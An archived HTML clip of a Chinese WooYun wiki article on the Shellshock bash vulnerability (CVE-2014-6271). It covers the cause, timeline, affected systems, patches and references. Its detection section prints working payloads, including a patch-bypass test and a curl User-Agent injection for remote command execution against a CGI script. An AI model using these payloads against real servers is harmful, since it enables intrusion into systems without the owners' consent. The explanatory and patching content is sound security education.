@@ -1,0 +1,197 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 6.8 (453748)"/><meta name="created" content="2016-10-19 12:45:40 +0000"/><meta name="source" content="web.clip"/><meta name="source-url" content="http://wiki.wooyun.org/server:bash"/><meta name="updated" content="2016-10-19 12:45:40 +0000"/><title>server:bash [WooYun WiKi]</title></head><body><div style="-evernote-webclip:true"><br/><div style="font-size: 16px"><div style="box-sizing:border-box;font-family:sans-serif;text-size-adjust:100%;font-size:10px;-webkit-tap-highlight-color:rgba(0, 0, 0, 0);"><div style="box-sizing:border-box;font-family:&quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:small;line-height:1.42857;color:rgb(51, 51, 51);background:rgb(253, 253, 253);"><div style="box-sizing:border-box;"><div style="box-sizing:border-box;"><span style="box-sizing:border-box;"><div style="box-sizing:border-box;"><div style="box-sizing:border-box;background-color:rgb(255, 255, 255);border-radius:4px;box-shadow:rgba(0, 0, 0, 0.0470588) 0px 1px 1px;"><div style="box-sizing:border-box;"><span style="display:table;"/>
+
+                                          
+              <div style="box-sizing:border-box;position:fixed;float:right;z-index:1024;top:10px;right:10px;">
+                
+<div style="float:right;box-sizing:border-box;background-color:rgb(255, 255, 255);border-radius:4px;box-shadow:rgba(0, 0, 0, 0.0470588) 0px 1px 1px;border-color:rgb(221, 221, 221);border:1px solid transparent;margin:0px 0px 1.4em 1.4em;width:auto;color:inherit;font-size:0.95em;margin-left:20px;">
+<h3 style="border-bottom:1px solid transparent;box-sizing:border-box;border-top-left-radius:3px;font-weight:bold;color:rgb(51, 51, 51);border-color:rgb(221, 221, 221);background-color:rgb(245, 245, 245);font-family:inherit;line-height:1.1;border-top-right-radius:3px;padding:5px;font-size:0.95em;margin:0px;cursor:pointer;"><i style="box-sizing:border-box;position:relative;top:1px;display:inline-block;font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;font-weight:400;line-height:1;-webkit-font-smoothing:antialiased;padding-right:5px;"><span style="font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;font-weight:400;line-height:1;"></span></i> <strong style="line-height:1;font-weight:400;top:1px;display:inline-block;font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;position:relative;-webkit-font-smoothing:antialiased;box-sizing:border-box;float:right;margin:0px 0.2em;padding-right:5px;"><span style="font-weight:400;font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;line-height:1;"></span></strong></h3>
+
+</div>
+
+              </div>
+
+              
+              
+<h1 style="box-sizing:border-box;font-size:36px;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin:40px 0px 20px;padding-bottom:9px;border-bottom:1px solid rgb(238, 238, 238);margin-top:10px;">bash漏洞（shellshock）</h1>
+<div style="box-sizing:border-box;"
+
+/>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">1、漏洞简介</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+CVE-2014-6271漏洞又称破壳漏洞，是Stéphane Chazelas（法国）于2014年9月中旬发现的SHELL的一个漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行shell命令。该漏洞影响极其严重，修复过程也十分坎坷。时间线大致如下：
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+9月24日：CVE-2014-6271被公开，补丁也快速形成，但因补丁修复不完整导致CVE-2014-7169；
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+9月27日：因前两个漏洞补丁修复不完整导致CVE-2014-6277；
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+9月30日：因在前三个漏洞补丁修复不完整导致CVE-2014-6278；
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+9月28日：Bash的两个溢出漏洞又被公开CVE-2014-7186、CVE-2014-7187。
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">2、漏洞成因</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+存在漏洞的bash会将形如
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;color:rgb(204, 0, 0);font-style:italic;">$ </span><span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">env</span> <span style="box-sizing:border-box;color:rgb(153, 51, 51);">x</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">'() { :;}; echo vulnerable'</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">bash</span> <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-c</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">"echo this is a test"</span></pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+的字符解析为一个函数定义和一个command。导致任意命令执行。
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">3、漏洞检测及利用</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+bash破壳漏洞本地检测
+官方验证版 
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">env</span> <span style="box-sizing:border-box;color:rgb(153, 51, 51);">x</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">'() { :;}; echo vulnerable; bash -c "echo this is a test"</span></pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+若系统bash存在漏洞则会打印出
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;">vulnerable
+this is a test</pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+官方patch绕过版
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">env</span> <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-i</span> <span style="box-sizing:border-box;color:rgb(153, 51, 51);">X</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">'() { (a)=&gt;\'</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">bash</span> <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-c</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'echo date'</span>; <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">cat</span> <span style="box-sizing:border-box;color:rgb(0, 0, 102);">echo</span></pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+http cgi远程命令执行
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;">curl <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-A</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">"() { :; }; /bin/ls /; uname -a"</span> http:<span style="box-sizing:border-box;color:rgb(102, 204, 102);">//</span>www.aaa.com<span style="box-sizing:border-box;color:rgb(102, 204, 102);">/</span>bbb.cgi <span style="box-sizing:border-box;color:rgb(102, 0, 51);">-v</span></pre>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">4、影响范围</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+“破壳”是一个严重漏洞的别名，在Red Hat、CentOS、Ubuntu 、Fedora 、Amazon Linux 、OS X 10.10中均拥有存在CVE-2014-6271（即“破壳”漏洞）漏洞的Bash版本，同时由于Bash在各主流操作系统的广泛应用，此漏洞的影响范围包括但不限于大多数应用Bash的Unix、Linux、Mac <abbr title="Operating System" style="box-sizing:border-box;border-bottom:1px dotted rgb(119, 119, 119);cursor:help;">OS</abbr> X，而针对这些操作系统管理下的数据均存在高危威胁。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+此漏洞可能会影响到使用ForceCommand功能的OpenSSH sshd、使用mod<em style="box-sizing:border-box;">cgi或mod</em>cgid的Apache服务器、DHCP客户端、SMTP服务器等其他使用bash作为解释器的应用。
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">5、实际案例</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184857/http://www.wooyun.org/bugs/wooyun-2010-078387" title="http://www.wooyun.org/bugs/wooyun-2010-078387" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">中国医学科学院病原生物学研究所官网存在破壳漏洞</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184857/http://www.wooyun.org/bugs/wooyun-2010-078029" title="http://www.wooyun.org/bugs/wooyun-2010-078029" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">华中农业大学-生物信息学中心-下某实验室网站存在破壳漏洞</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184857/http://www.wooyun.org/bugs/wooyun-2010-077300" title="http://www.wooyun.org/bugs/wooyun-2010-077300" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">CSDN某业务Bash（CVE-2014-6271）漏洞导致系统可被入侵</a>
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">6、漏洞修复</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+安装最新的补丁
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+在各种GNU/Linux发行版里需要升级：
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+Debian-based（包括Ubuntu）:
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">sudo</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">apt-get update</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">&amp;&amp;</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">apt-get upgrade</span></pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+Gentoo：
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;">sudo emerge --sync &amp;&amp; glsa-check -f affected</pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+OpenSSH:
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;">加入no-pty</pre>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">7、相关资源</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184857/http://www.freebuf.com/articles/web/45520.html" title="http://www.freebuf.com/articles/web/45520.html" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">从语法解析角度分析Bash破壳漏洞</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184857/http://www.freebuf.com/news/48331.html" title="http://www.freebuf.com/news/48331.html" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之一</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184857/http://www.freebuf.com/articles/system/48357.html" title="http://www.freebuf.com/articles/system/48357.html" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之二</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184857/http://www.freebuf.com/articles/system/48406.html" title="http://www.freebuf.com/articles/system/48406.html" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之三</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184857/http://www.freebuf.com/news/49292.html" title="http://www.freebuf.com/news/49292.html" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">Bash破壳漏洞（ShellShock）再变身：针对邮件服务器SMTP攻击</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184857/http://www.freebuf.com/articles/system/50065.html" title="http://www.freebuf.com/articles/system/50065.html" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">安全科普：让高大上的Bash破壳漏洞不再难理解（上）</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184857/http://www.freebuf.com/articles/system/50707.html" title="http://www.freebuf.com/articles/system/50707.html" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">安全科普：让高大上的Bash破壳漏洞不再难理解（下）</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184857/http://drops.wooyun.org/papers/3064" title="http://drops.wooyun.org/papers/3064" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">CVE-2014-6271资料汇总</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307184857/http://drops.wooyun.org/papers/3268" title="http://drops.wooyun.org/papers/3268" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">Shellshock漏洞回顾与分析测试</a>
+</p>
+
+</div>
+
+              
+
+                            
+            <span style="display:table;clear:both;"/></div></div></div></span></div></div></div></div></div><br/></div></body></html>
